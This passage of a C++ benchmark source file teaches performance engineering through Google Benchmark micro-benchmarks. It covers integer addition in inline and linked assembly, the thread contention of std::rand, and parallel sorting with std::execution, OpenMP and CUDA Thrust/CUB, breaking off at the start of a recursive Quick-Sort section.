/**
 *  @brief  Low-level micro-benchmarks for building a performance-first mindset.
 *  @file   less_slow.cpp
 *  @author Ash Vardanian
 *
 *  There's no Easter bunny, no tooth fairy... and no free abstractions!
 *  Every abstraction—no matter how elegant—comes with tradeoffs. Sometimes
 *  the cost is in readability, like extra layers of indirection, and other
 *  times, it's in performance, with additional instructions or memory overhead.
 *
 *  This project dives into such tradeoffs, helping engineers develop a deeper
 *  understanding of the costs associated with seemingly simple constructs.
 *  While the examples are written in C++20 and focus on GCC and Clang,
 *  targeting x86_64 and ARM64 architectures, the principles are universal.
 *
 *  The benchmarks cover the costs of numerical operations, designing micro-
 *  kernels, parallelism, computational complexity, branch prediction, compiler
 *  limitations, and @b composing those with callbacks, coroutines, and ranges
 *  into more complex systems. Same principles apply to Rust, Python, and Go,
 *  so parts of the project have been reproduced in those languages.
 *
 *  @see Rust Benchmarks: https://github.com/ashvardanian/less_slow.rs
 *  @see Python Benchmarks: https://github.com/ashvardanian/less_slow.py
 *
 *  Most measurements were performed on Intel Sapphire Rapids CPUs on AWS,
 *  but the findings match across hardware platforms unless explicitly noted.
 *
 *  Worth noting, that some examples may seem over-engineered, but they are
 *  no less relevant or impractical. They may be hard to recognize at first,
 *  but they universally appear in larger codebases, as a form of emergent
 *  complexity.
 *
 *  Let's benchmark them all and dive into the implementation details that
 *  make those abstractions @b less_slow!
 */
#include <benchmark/benchmark.h>

namespace bm = benchmark;

#pragma region - Basics

#pragma region How to Benchmark and Randomness

/**
 *  Using Google Benchmark is simple. You define a C++ function and then
 *  register it using the provided C macros. The suite will invoke your
 *  function, passing a `State` object, that dynamically chooses the number
 *  of loops to run based on the time it takes to execute each cycle.
 *
 *  For simplicity, let's start by benchmarking the most basic operation -
 *  the 32-bit integer addition, universally natively supported by every
 *  modern CPU, be it x86, ARM, or RISC-V, 32-bit or 64-bit, big-endian
 *  or little-endian.
 */
#include <cstdint> // `std::int32_t` and other sized integers
#include <cstdlib> // `std::rand`

static void i32_addition(bm::State &state) {
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state) c = a + b;

    // In some categories of projects, benchmarks are easier to convert
    // into tests, than the other way around :)
    if (c != a + b) state.SkipWithError("Incorrect sum!");
}

BENCHMARK(i32_addition);

/**
 *  Trivial kernels operating on constant values are not the most
 *  straightforward candidates for benchmarking. The compiler can easily
 *  optimize them, and the CPU can predict the result... showing "0ns" - zero
 *  nanoseconds per iteration. Unfortunately, no operation runs this fast on the
 *  computer. On a 3 GHz CPU, you would perform 3 Billion ops every second.
 *  So, each would take 0.33ns, not 0ns. If we change the compilation
 *  settings, discarding the @b `-O3` flag for "Release build" optimizations,
 *  we may see a non-zero value, but it won't represent real-world performance.
 *
 *  One way to avoid, is just implementing the kernel in @b inline-assembly,
 *  interleaving it with the higher-level C++ code:
 */

#if defined(__GNUC__) && !defined(__clang__) //! GCC and Clang support inline assembly, MSVC doesn't!

#if defined(__x86_64__) || defined(__i386__) //? Works for both 64-bit and 32-bit x86 architectures

static void i32_addition_inline_asm(bm::State &state) {
    // In inline assembly for x86 we are not explicitly naming the registers,
    // so in the 32-bit and 64-bit modes different registers will be used:
    // - For 32-bit (`__i386__`): Registers like `eax` and `ebx` will be used,
    //   and pointers will be 4 bytes wide.
    // - For 64-bit targets (`__x86_64__`): Registers like `eax`, `r8d` will
    //   be used for 32-bit values, while pointers will be 8 bytes wide.
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state) {
        asm volatile(
            // Perform a 32-bit addition of `b` into `a`.
            "addl %[b], %[a]\n\t"
            // `[a] "=r"(c)` means treat `c` as the output for the result.
            // `"0"(a)` means reuse the same register allocated to the first output operand for `a`.
            // `[b] "r"(b)` means that `b` is a read-only operand that must reside in a register.
            : [a] "=r"(c)
            : "0"(a), [b] "r"(b)
            // Tell the compiler that this code modifies the condition codes (CPU flags),
            // so it cannot assume those flags are still valid after this assembly block.
            : "cc");
    }
    if (c != a + b) state.SkipWithError("Incorrect sum!");
}

BENCHMARK(i32_addition_inline_asm);

#elif defined(__aarch64__) //? The following kernel is just for the 64-bit Arm

static void i32_addition_inline_asm(bm::State &state) {
    // In inline assembly for AArch64 we use `%w` registers for 32-bit operations.
    // That means `add %w[a], %w[a], %w[b]` will add the 32-bit subregisters
    // of these named operands. Pointers remain 8 bytes wide, but here we only
    // deal with 32-bit integers.
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state) {
        asm volatile(
            // Perform a 32-bit addition of `b` into `a`: `%w[a] := %w[a] + %w[b]`.
            "add %w[a], %w[a], %w[b]\n\t"
            // `[a] "=r"(c)` means treat `c` as the output for the result of the operation.
            // `"0"(a)` says to reuse the same register allocated to the first output operand for `a`.
            // `[b] "r"(b)` means that `b` is a read-only operand that must reside in a register.
            : [a] "=r"(c)
            : "0"(a), [b] "r"(b)
            // Tell the compiler that this assembly modifies the condition flags (CPU flags),
            // so it cannot rely on them remaining unaltered after this assembly block.
            : "cc");
    }
    if (c != a + b) state.SkipWithError("Incorrect sum!");
}
BENCHMARK(i32_addition_inline_asm);

#endif // defined(__x86_64__) || defined(__i386__) || defined(__aarch64__)

#endif // defined(__GNUC__) && !defined(__clang__)

/**
 *  We can also put the assembly kernels into separate `.S` files and link them
 *  to our C++ target. Each approach has its technical tradeoffs:
 *
 *  - Inline Assembly:
 *    Requires direct interaction with registers, which must be carefully managed
 *    using constraints and clobbers to ensure the compiler knows which registers
 *    are modified.  While inline assembly enables tight coupling with C++ logic
 *    and access to local variables, it is less portable due to compiler-specific
 *    syntax and optimization variability. Debugging inline assembly can also be
 *    challenging as it is embedded in higher-level code.
 *
 *  - Separate Assembly Files:
 *    Abstracts away register management through adherence to the platform's
 *    Application Binary Interface @b (ABI). This makes the assembly routines
 *    easier to debug, test, and reuse across projects. However, separate files
 *    require more boilerplate for function calls, stack management, and
 *    parameter passing. They are preferred for large or standalone routines
 *    that benefit from modularity and clear separation from C++ code.
 *
 *  In this project, we provide assembly kernels for two platforms:
 *
 *  - @b less_slow_aarch64.S - for the 64-bit ARM architecture.
 *  - @b less_slow_amd64.S - for the x86_64 architecture, with 64-bit extensions,
 *    originally introduced by AMD.
 */
#if !defined(_MSC_VER) && (defined(__x86_64__) || defined(__aarch64__) || defined(__i386__) || defined(_M_X64))

extern "C" std::int32_t i32_add_asm_kernel(std::int32_t a, std::int32_t b);

static void i32_addition_asm(bm::State &state) {
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state) c = i32_add_asm_kernel(a, b);
    if (c != a + b) state.SkipWithError("Incorrect sum!");
}

BENCHMARK(i32_addition_asm);

#endif // defined(__x86_64__) || defined(__aarch64__)

/**
 *  So far the results may be:
 *
 *  - `i32_addition` - @b 0ns, as the compiler optimized the code away.
 *  - `i32_addition_inline_asm` - @b 0.2ns, a single instruction was inlined.
 *  - `i32_addition_asm` - @b 0.9ns, a new stack frame was created!
 *
 *  Keep this in mind! Even with Link-Time Optimization @b (LTO) enabled,
 *  most of the time, compilers won't be able to inline your Assembly kernels.
 *
 *  Don't want to switch to Assembly to fool the compilers? No problem!
 *  Another thing we can try - is generating random inputs on the fly with
 *  @b `std::rand()`, one of the most controversial operations in the
 *  C standard library.
 */
static void i32_addition_random(bm::State &state) {
    std::int32_t c;
    for (auto _ : state) c = std::rand() + std::rand();
    (void)c; //? Silence "variable `c` set but not used" warning
}

BENCHMARK(i32_addition_random);

/**
 *  Running this will report @b 31ns or about 100 CPU cycles. Is integer
 *  addition really that expensive? It's used all the time, even when you are
 *  accessing @b `std::vector` elements and need to compute the memory address
 *  from the pointer and the index passed to the @b `operator[]` or `at()`
 *  functions. The answer is - no, it's not. The addition takes a single CPU
 *  cycle and is very fast.
 *
 *  Chances are we just benchmarked something else... the @b `std::rand()`
 *  function. What if we could ask Google Benchmark to ignore the time spent
 *  in the `std::rand()` function? There are `PauseTiming` and `ResumeTiming`
 *  functions just for that!
 */

static void i32_addition_paused(bm::State &state) {
    std::int32_t a, b, c;
    for (auto _ : state) {
        state.PauseTiming();
        a = std::rand(), b = std::rand();
        state.ResumeTiming();
        bm::DoNotOptimize(c = a + b);
    }
}

BENCHMARK(i32_addition_paused);

/**
 *  However, the `PauseTiming` and `ResumeTiming` functions are neither free.
 *  In the current implementation, they can easily take @b ~233ns, or around
 *  150 CPU cycles. They are useless in this case, but there is an alternative!
 *
 *  A typical pattern when implementing a benchmark is to initialize with a
 *  random value and then define a very cheap update policy that won't affect
 *  the latency much but will update the inputs. Increments, bit shifts, and bit
 *  rotations are common choices!
 *
 *  It's also a good idea to use native @b CRC32 and @b AES instructions to
 *  produce a random state, as it's often done in StringZilla. Another common
 *  approach is to use integer multiplication, usually derived from the
 *  Golden Ratio, as in the Knuth's multiplicative hash (with `2654435761`).
 *
 *  @see StringZilla: https://github.com/ashvardanian/stringzilla
 */

static void i32_addition_randomly_initialized(bm::State &state) {
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) + (++b));
}

BENCHMARK(i32_addition_randomly_initialized);

/**
 *  On x86, the `i32_addition_randomly_initialized` benchmark performs two
 *  @b `inc` instructions and one @b `add` instruction. This should take less
 *  than @b 0.4ns on a modern CPU. The first cycle increments `a` and `b`
 *  simultaneously on different Arithmetic Logic Units (ALUs) of the same core,
 *  while the second cycle performs the final accumulation. At least @b 97% of
 *  the benchmark time was spent in the `std::rand()` function... even in a
 *  single-threaded benchmark.
 *
 *  This may seem like a trivial example, far removed from "real-world
 *  production systems" of "advanced proprietary software designed by the
 *  world's leading engineers." Sadly, issues like this persist in many
 *  benchmarks and sometimes influence multi-billion-dollar decisions 🤬
 *
 *  @see Bad I/O benchmark examples: https://www.unum.cloud/blog/2022-03-22-ucsb
 *
 *  How bad is it? Let's re-run the same two benchmarks, this time on all cores.
 */
#include <thread> // `std::thread::hardware_concurrency`
#if defined(__linux__)
#include <unistd.h> // `_SC_NPROCESSORS_ONLN`
#elif defined(__APPLE__)
#include <sys/sysctl.h> // `sysctlbyname` on macOS
#elif defined(_WIN32)
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <Windows.h>
#include <WinBase.h>
#endif

/**
 *  @brief  Returns the number of physical cores available on the system,
 *          as opposed to the logical cores, which include hyper-threading.
 */
std::size_t physical_cores() {
#if defined(__linux__)
    int nproc = sysconf(_SC_NPROCESSORS_ONLN);
    return static_cast<std::size_t>(nproc);
#elif defined(__APPLE__)
    int nproc = 0;
    size_t len = sizeof(nproc);
    sysctlbyname("hw.physicalcpu", &nproc, &len, nullptr, 0);
    return static_cast<std::size_t>(nproc);
#elif defined(_WIN32)
    // On Windows, both `std::thread::hardware_concurrency` and `GetSystemInfo`
    // return at most 64 cores, as limited by a single windows processor group.
    // However, starting with newer versions of Windows, applications can seamlessly
    // span across multiple processor groups.
    DWORD buffer_size = 0;
    GetLogicalProcessorInformationEx(RelationProcessorCore, nullptr, &buffer_size);
    if (buffer_size == 0) throw std::runtime_error("GetLogicalProcessorInformationEx failed to get buffer size");

    using core_info_t = PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX;
    std::vector<BYTE> buffer(buffer_size);
    if (!GetLogicalProcessorInformationEx(RelationProcessorCore, reinterpret_cast<core_info_t>(buffer.data()),
                                          &buffer_size))
        throw std::runtime_error("GetLogicalProcessorInformationEx failed to get core info");

    std::size_t core_count = 0;

    for (DWORD buffer_progress = 0; buffer_progress < buffer_size;) {
        core_info_t ptr = reinterpret_cast<core_info_t>(buffer.data() + buffer_progress);
        if (ptr->Relationship == RelationProcessorCore) ++core_count;
        buffer_progress += ptr->Size;
    }

    return core_count;
#else
    return std::thread::hardware_concurrency();
#endif
}

BENCHMARK(i32_addition_random)->Threads(physical_cores());
BENCHMARK(i32_addition_randomly_initialized)->Threads(physical_cores());

/**
 *  The latency of the `std::rand` variant skyrocketed from @b 31ns in
 *  single-threaded mode to @b 10'974ns when running on multiple threads,
 *  while our optimized variant remained unaffected.
 *
 *  This happens because `std::rand`, like many other LibC functions, relies
 *  on a global state protected by a mutex to ensure thread-safe access.
 *  This mutex-based synchronization becomes a severe bottleneck when multiple
 *  threads contend for the same global resource.
 *
 *  Here's the relevant snippet from the GNU C Library (GlibC) implementation:
 *
 *      long int __random (void) {
 *          int32_t retval;
 *          __libc_lock_lock (lock);
 *          (void) __random_r (&unsafe_state, &retval);
 *          __libc_lock_unlock (lock);
 *          return retval;
 *      }
 *      weak_alias (__random, random)
 *
 *  This perfectly illustrates why experienced low-level engineers often avoid
 *  the "singleton" pattern, where a single shared global state introduces
 *  contention and kills performance under multi-threaded workloads.
 *
 *  @see GlibC implementation:
 *       https://code.woboq.org/userspace/glibc/stdlib/random.c.html#291
 *  @see "Faster random integer generation with batching" by Daniel Lemire:
 *       https://lemire.me/blog/2024/08/17/faster-random-integer-generation-with-batching/
 */

#pragma endregion // How to Benchmark and Randomness

#pragma region Parallelism and Computational Complexity

/**
 *  The most obvious way to speed up code is to parallelize it. Since 2002, CPU
 *  clock speeds have plateaued, with CPUs getting wider instead of faster,
 *  featuring more cores and hardware threads. However, not all algorithms can
 *  be parallelized easily. Some are inherently sequential, while others are
 *  simply too small to benefit from parallel execution.
 *
 *  Let's begin with @b `std::sort`, one of the best-known and best-optimized
 *  algorithms in the C++ Standard Library.
 *
 *  @see Docs for `std::sort`: https://en.cppreference.com/w/cpp/algorithm/sort
 *
 *  A straightforward benchmarking strategy could involve applying a random
 *  shuffle before each sort. However, this would introduce variability, making
 *  the benchmark less predictable. Knowing that `std::sort` uses a Quick-Sort
 *  variant, we can instead reverse the array on each iteration — a classic
 *  worst-case scenario for this family of algorithms.
 *
 *  We can also parameterize the benchmark with runtime-configurable values,
 *  such as the array size and whether to include the preprocessing step.
 *  Google Benchmark provides the @b `Args` function precisely for this purpose.
 */
#include <algorithm> // `std::sort`
#include <numeric>   // `std::iota`

/**
 *  @brief  A minimalistic `std::vector` replacement, wrapping an aligned
 *          allocation similar to `std::unique_ptr`.
 *  @see    https://stackoverflow.com/a/79363156/2766161
 */
template <typename type_>
class aligned_array {

    type_ *data_ = nullptr;
    std::size_t size_ = 0;

  public:
#if defined(_MSC_VER) //! MSVC doesn't support `std::aligned_alloc` yet
    aligned_array(std::size_t size, std::size_t alignment = 64) : size_(size) {
        data_ = static_cast<type_ *>(_aligned_malloc(sizeof(type_) * size_, alignment));
        if (!data_) throw std::bad_alloc();
    }
    ~aligned_array() noexcept { _aligned_free(data_); }
#else
    aligned_array(std::size_t size, std::size_t alignment = 64) : size_(size) {
        data_ = static_cast<type_ *>(std::aligned_alloc(alignment, sizeof(type_) * size_));
        if (!data_) throw std::bad_alloc();
    }
    ~aligned_array() noexcept { std::free(data_); }
#endif

    aligned_array(aligned_array const &) = delete;
    aligned_array &operator=(aligned_array const &) = delete;
    aligned_array(aligned_array &&) = delete;
    aligned_array &operator=(aligned_array &&) = delete;

    type_ *begin() const noexcept { return data_; }
    type_ *end() const noexcept { return data_ + size_; }
    type_ &operator[](std::size_t index) noexcept { return data_[index]; }
    type_ operator[](std::size_t index) const noexcept { return data_[index]; }
};

static void sorting(bm::State &state) {

    auto length = static_cast<std::size_t>(state.range(0));
    auto include_preprocessing = static_cast<bool>(state.range(1));

    aligned_array<std::uint32_t> array(length);
    std::iota(array.begin(), array.end(), 1u);

    for (auto _ : state) {

        if (!include_preprocessing) state.PauseTiming();
        // Reverse order is the most classical worst case, but not the only one.
        std::reverse(array.begin(), array.end());
        if (!include_preprocessing) state.ResumeTiming();
        std::sort(array.begin(), array.end());
    }

    if (!std::is_sorted(array.begin(), array.end())) state.SkipWithError("Array is not sorted!");
}

BENCHMARK(sorting)->Args({3, false})->Args({3, true});
BENCHMARK(sorting)->Args({4, false})->Args({4, true});
BENCHMARK(sorting)->Args({1024, false})->Args({1024, true});
BENCHMARK(sorting)->Args({8196, false})->Args({8196, true});

/**
 *  This highlights how optimal control flow depends on input size:
 *  - On small inputs, it's faster to perform preprocessing.
 *  - On larger inputs, the overhead from preprocessing outweighs its benefits.
 *
 *  Until C++17, the standard lacked built-in parallel algorithms.
 *  The C++17 standard introduced the @b `std::execution` namespace, including
 *  the @b `std::execution::par_unseq` policy for parallel, order-independent
 *  execution.
 *
 *  To check for support, the @b `__cpp_lib_parallel_algorithm` standard
 *  feature testing macro can be used.
 *
 *  @see Feature testing macros: https://en.cppreference.com/w/cpp/utility/feature_test
 */

#if defined(__cpp_lib_parallel_algorithm)
#include <execution> // `std::execution::par_unseq`

template <typename execution_policy_>
static void sorting_with_executors( //
    bm::State &state, execution_policy_ &&policy) {

    auto length = static_cast<std::size_t>(state.range(0));
    aligned_array<std::uint32_t> array(length);
    std::iota(array.begin(), array.end(), 1u);

    for (auto _ : state) {
        std::reverse(policy, array.begin(), array.end());
        std::sort(policy, array.begin(), array.end());
    }

    if (!std::is_sorted(array.begin(), array.end())) state.SkipWithError("Array is not sorted!");
    state.SetComplexityN(length);

    // Want to report something else? Sure, go ahead:
    //
    //      state.counters["temperature_on_mars"] = bm::Counter(-95.4);
    //
    // Just please, for the love of rockets, use the metric system.
    // We've already lost one Mars climate orbiter to a tragic "feet vs. meters"
    // debate. Let's not make NASA cry again. 🚀💥
}

BENCHMARK_CAPTURE(sorting_with_executors, seq, std::execution::seq)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    ->MinTime(10)
    ->Complexity(bm::oNLogN)
    ->UseRealTime();

/**
 *  Memory leak observed in libstdc++ using oneTBB under specific conditions:
 *  @see Github issue: https://github.com/ashvardanian/less_slow.cpp/issues/17
 *
 *  A workaround is implemented by limiting the number of iterations
 *  for this benchmark to a single run.
 *
 *  This adjustment is applied to the benchmark below:
 */
BENCHMARK_CAPTURE(sorting_with_executors, par_unseq, std::execution::par_unseq)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    //! Revert from `Iterations` to `MinTime` once the leak is resolved!
    //! ->MinTime(10)
    ->Iterations(1)
    ->Complexity(bm::oNLogN)
    ->UseRealTime();

/**
 *  Without @b `UseRealTime()`, CPU time is measured by default.
 *  This distinction matters: if your process sleeps, it no longer
 *  accumulates CPU time.
 *
 *  The @b `Complexity` function specifies the asymptotic computational
 *  complexity of the benchmark. To estimate the scaling factor, we benchmark
 *  over a broad range of input sizes, from 2^20 (1 million)
 *  to 2^28 (256 million) entries — translating to 4 MB to 1 GB of data.
 *
 *  This approach outputs both timings and inferred complexity estimates:
 *
 *     sorting_with_executors/seq/1048576            5776408 ns      5776186 ns
 *     sorting_with_executors/seq/4194154           25323450 ns      2532153 ns
 *     sorting_with_executors/seq/16777216         109073782 ns    109071515 ns
 *     sorting_with_executors/seq/67108864         482794615 ns    482777617 ns
 *     sorting_with_executors/seq/268435456       2548725384 ns   2548695506 ns
 *     sorting_with_executors/seq_BigO                  0.34 NlgN       0.34 NlgN
 *     sorting_with_executors/seq_RMS                      8 %             8 %
 *
 *  As demonstrated, scaling isn't strictly linear, especially for tasks
 *  that aren't fully data-parallel.
 *
 *  @see "105 STL Algorithms in Less Than an Hour" by Jonathan Boccara at CppCon 2018:
 *       https://youtu.be/2olsGf6JIkU
 *  @see "The C++17 Parallel Algorithms Library and Beyond"
 *       by Bryce Adelstein Lelbach at CppCon 2016: https://youtu.be/Vck6kzWjY88
 */

#endif // defined(__cpp_lib_parallel_algorithm)

#if defined(_OPENMP)
/**
 *  An alternative to "Parallel STL" is to design a custom parallel solution
 *  using some thread pool or task scheduler. The most common approach is to
 *  divide the input into blocks that can be processed independently and then
 *  implement a tree-like parallel aggregation of partial results.
 *
 *  Many thread pools exist, including the underlying Intel's @b oneTBB,
 *  as well as OpenMP. The latter is not a library, but a broadly adopted
 *  set of compiler directives, capable of parallelizing loops and sections.
 */
#include <omp.h> // `omp_get_max_threads`

std::size_t round_to_multiple(std::size_t value, std::size_t multiple) {
    return ((value + multiple - 1) / multiple) * multiple;
}

static void sorting_with_openmp(bm::State &state) {

    auto const length = static_cast<std::size_t>(state.range(0));
    auto const chunks = static_cast<std::size_t>(omp_get_max_threads());
    // Let's round up chunk lengths to presumably 64-byte cache lines.
    auto const chunk_length = round_to_multiple(length / chunks, 64 / sizeof(std::uint32_t));
    auto const chunk_start_offset = [=](std::size_t i) -> std::size_t {
        std::size_t offset = i * chunk_length;
        return offset < length ? offset : length;
    };

    aligned_array<std::uint32_t> array(length);
    std::iota(array.begin(), array.end(), 1u);

    for (auto _ : state) {
        std::reverse(array.begin(), array.end());
        //! Remarkably, on Windows, OpenMP can't handle unsigned integers,
        //! so we use `std::int64_t` over `std::size_t`.
#pragma omp parallel for
        // Sort each chunk in parallel
        for (std::int64_t i = 0; i < chunks; i++) {
            std::size_t start = chunk_start_offset(static_cast<std::size_t>(i));
            std::size_t finish = chunk_start_offset(static_cast<std::size_t>(i) + 1);
            std::sort(array.begin() + start, array.begin() + finish);
        }

        // Merge the blocks in a tree-like fashion doubling the size of the merged block each time
        for (std::size_t merge_step = 1; merge_step < chunks; merge_step *= 2) {
#pragma omp parallel for
            for (std::int64_t i = 0; i < chunks; i += 2 * merge_step) {
                std::size_t first_chunk_index = static_cast<std::size_t>(i);
                std::size_t second_chunk_index = first_chunk_index + merge_step;
                if (second_chunk_index >= chunks) continue; // No merge needed

                // We use `inplace_merge` as opposed to `std::merge` to avoid extra memory allocations,
                // but it may not be as fast: https://stackoverflow.com/a/21624819/2766161
                auto start = chunk_start_offset(first_chunk_index);
                auto mid = chunk_start_offset(second_chunk_index);
                auto finish = chunk_start_offset(std::min(second_chunk_index + merge_step, chunks));
                std::inplace_merge(array.begin() + start, array.begin() + mid, array.begin() + finish);
            }
        }
    }

    if (!std::is_sorted(array.begin(), array.end())) state.SkipWithError("Array is not sorted!");
    state.SetComplexityN(length);
}

BENCHMARK(sorting_with_openmp)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    ->MinTime(10)
    ->Complexity(bm::oNLogN)
    ->UseRealTime();

#endif // defined(_OPENMP)

/**
 *  Detecting CUDA availability isn't trivial. NVIDIA's CUDA toolchain defines:
 *  - __NVCC__: Set only when using the NVCC compiler.
 *  - __CUDACC__: Set when NVCC compiles CUDA code (host or device).
 *  - __CUDA_ARCH__: Informs the CUDA version for compiling device (GPU) code.
 *
 *  Since host compilers may not define these macros, we use @b `__has_include`
 *  to check for `<cuda_runtime.h>` as an indicator that CUDA is available.
 *
 *  @see NVCC Identification Macros docs:
 *       https://docs.nvidia.com/cuda/cuda-compiler-driver-nvcc/#nvcc-identification-macro
 */
#define _LESS_SLOW_WITH_CUDA 0
#if defined(__has_include)
#if __has_include(<cuda_runtime.h>)
#define _LESS_SLOW_WITH_CUDA 1
#endif
#endif

#if _LESS_SLOW_WITH_CUDA

/**
 *  Unlike STL, Thrust provides some very handy abstractions for sorting
 *  one array by values in another. We are not going to use them here!
 *  And we will also avoid instantiating any CUDA @b `<algorithm>`-like
 *  templates in this translation unit to better separate the host-side
 *  code and device-side and keep compilation time sane!
 *
 *  @see Sorting in Thrust: https://nvidia.github.io/cccl/thrust/api_docs/algorithms/sorting
 */
#include <cuda_runtime.h>         // `cudaError_t`
#include <thrust/device_vector.h> // `thrust::device_vector`
#include <thrust/host_vector.h>   // `thrust::host_vector`

using namespace std::string_literals; // For `""s` literals

/**
 *  @brief  Reverses the array and sorts it with Nvidia's Thrust from CCCL.
 *  @see    Declared in `less_slow.cpp`, but defined in @b `less_slow.cu`!
 */
extern void reverse_and_sort_with_thrust(std::uint32_t *device_pointer, std::size_t array_length);

static void sorting_with_thrust(benchmark::State &state) {
    const auto count = static_cast<std::size_t>(state.range(0));

    // Typically, the data is first allocated on the "host" CPU side,
    // initialized, and then transferred to the "device" GPU memory.
    // In our specific case, we could have also used `thrust::sequence`.
    thrust::host_vector<std::uint32_t> host_array(count);
    std::iota(host_array.begin(), host_array.end(), 1u);
    thrust::device_vector<std::uint32_t> device_array = host_array;

    for (auto _ : state) {
        reverse_and_sort_with_thrust(device_array.data().get(), count);
        cudaError_t error = cudaDeviceSynchronize(); //! Block until the GPU has completed all tasks
        if (error != cudaSuccess) state.SkipWithError("CUDA error after kernel launch: "s + cudaGetErrorString(error));
        benchmark::DoNotOptimize(device_array.data());
    }

    state.SetComplexityN(count);
    state.SetItemsProcessed(count * state.iterations());
    state.SetBytesProcessed(count * state.iterations() * sizeof(std::uint32_t));
}

BENCHMARK(sorting_with_thrust)
    ->RangeMultiplier(4)
    ->Range(1ll << 20, 1ll << 28)
    ->MinTime(10)
    ->Complexity(benchmark::oN) // Not `oNLogN` - it's Radix Sort!
    ->UseRealTime();

/**
 *  Thrust, just like STL, is often convenient but not always the fastest.
 *  It may allocate temporary memory, perform extra copies, or use suboptimal
 *  algorithms. Thrust's underlying CUB provides more control and a lot of
 *  functionality for both device-wide, block-wide, and warp-wide operations.
 *
 *  @see CUB docs: https://nvidia.github.io/cccl/cub/modules
 *
 *  Sadly, CUB provides no `reverse` functionality, so we need to combine it
 *  with a Thrust call, scheduling them on the same job queue. We will also
 *  pre-allocate temporary memory for CUB's sorting algorithm, and will use
 *  device-side timers for more accurate measurements.
 */
extern std::size_t reverse_and_sort_with_cub_space(std::uint32_t *device_pointer, std::size_t array_length);
extern void reverse_and_sort_with_cub(                       //
    std::uint32_t *device_pointer, std::size_t array_length, // Task
    void *temporary_pointer, std::size_t temporary_length,   // Space
    cudaStream_t stream);                                    // Order

static void sorting_with_cub(bm::State &state) {
    auto count = static_cast<std::size_t>(state.range(0));
    thrust::host_vector<std::uint32_t> host_array(count);
    std::iota(host_array.begin(), host_array.end(), 1u);
    thrust::device_vector<std::uint32_t> device_array = host_array;

    // One of the interesting design choices of CUB is that you can call
    // the target method with `NULL` arguments to infer the required temporary
    // memory amount. The Radix Sort generally requires ~ 2N temporary memory.
    //
    // Another one is the naming of the operations - `SortKeys` instead of `Sort`.
    // There is also `SortPairs` and `SortPairsDescending` in for key-value pairs.
    std::size_t temporary_bytes = reverse_and_sort_with_cub_space(device_array.data().get(), count);

    // Allocate temporary memory with `cudaMalloc` instead of using a `device_vector`,
    // due to potential compilation issues on the host-side compiler.
    std::byte *temporary_pointer = nullptr;
    cudaError_t error = cudaMalloc(&temporary_pointer, temporary_bytes);
    if (error != cudaSuccess) {
        state.SkipWithError("Failed to allocate temporary memory: "s + cudaGetErrorString(error));
        return;
    }

    // To schedule the Thrust and CUB operations on the same CUDA stream,
    // we need to wrap it into a "policy" object.
    cudaStream_t sorting_stream;
    cudaStreamCreate(&sorting_stream);
    auto policy = thrust::cuda::par.on(sorting_stream);

    // Create CUDA events for timing
    cudaEvent_t start_event, stop_event;
    cudaEventCreate(&start_event);
    cudaEventCreate(&stop_event);

    for (auto _ : state) {

        // Record the start event
        cudaEventRecord(start_event, sorting_stream);

        // Run the kernels
        reverse_and_sort_with_cub(              //
            device_array.data().get(), count,   // Task
            temporary_pointer, temporary_bytes, // Space
            sorting_stream);                    // Order

        // Record the stop event
        cudaEventRecord(stop_event, sorting_stream);
        cudaError_t error = cudaEventSynchronize(stop_event); //! Block until the GPU has completed all tasks
        if (error != cudaSuccess) state.SkipWithError("CUDA error after kernel launch: "s + cudaGetErrorString(error));

        float milliseconds = 0.0f;
        cudaEventElapsedTime(&milliseconds, start_event, stop_event);
        state.SetIterationTime(milliseconds / 1000.0f);
    }

    state.SetComplexityN(count);
    state.SetItemsProcessed(count * state.iterations());
    state.SetBytesProcessed(count * state.iterations() * sizeof(std::uint32_t));
}

BENCHMARK(sorting_with_cub)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    ->MinTime(10)
    ->Complexity(benchmark::oN) // Not `oNLogN` - it's Radix Sort!
    ->UseManualTime();

/**
 *  Comparing CPU to GPU performance is not straightforward, but we can compare
 *  Thrust to CUB solutions. On NVIDIA H200 GPU, for the largest 1 GB buffer:
 *
 *  - `sorting_with_thrust` takes @b 6.6 ms
 *  - `sorting_with_cub` takes @b 6 ms
 *
 *  10% ot 50% performance improvements are typical for CUB.
 */

#endif // _LESS_SLOW_WITH_CUDA

#pragma endregion // Parallelism and Computational Complexity

#pragma region Recursion

/**
 *  The `std::sort` and the underlying Quick-Sort are perfect research subjects
 *  for benchmarking and understanding how the computer works. Naively
 *  implementing the Quick-Sort in C/C++ would still put us at disadvantage,
 *  compared to the STL.
 *
 *  Most implementations we can find in textbooks, use recursion. Recursion is a
 *  beautiful concept, but it's not always the best choice for performance. Every
 *  nested call requires a new stack frame, and the stack is limited. Moreover,
 *  local variables need to be constructed and destructed, and the CPU needs to
 *  jump around in memory.
 *
 *  The alternative, as it often is in computing, is to use compensate runtime
 *  issue with memory. We can use a stack data structure to continuously store
 *  the state of the algorithm, and then process it in a loop.
 *
 *  The same ideas common appear when dealing with trees or graph algorithms.
 */
#include <utility> // `std::swap`

/**
 *  @brief  Quick-Sort helper function for array partitioning, reused by both
 *          recursive and iterative implementations.
 */
template <typename element_type_>
struct quick_sort_partition {
    using element_t = element_type_;

    inline std::ptrdiff_t operator()(element_t *arr, std::ptrdiff_t const low, std::ptrdiff_t const high) noexcept {
        element_t pivot = arr[high];
        std::ptrdiff_t i = low - 1;
        for (std::ptrdiff_t j = low; j <= high - 1; j++) {
            if (arr[j] > pivot) continue;
            i++;
            std::swap(arr[i], arr[j]);
        }
        std::swap(arr[i + 1], arr[high]);
        return i + 1;
    }
};

/**
 *  @brief  Quick-Sort implementation as a C++ function object, using recursion.
 *          Note, recursion and @b inlining are not compatible.
 */
template <typename element_type_>
struct quick_sort_recurse {
    using element_t = element_type_;
    using quick_sort_partition_t = quick_sort_partition<element_t>;
    using quick_sort_recurse_t = quick_sort_recurse<element_t>;

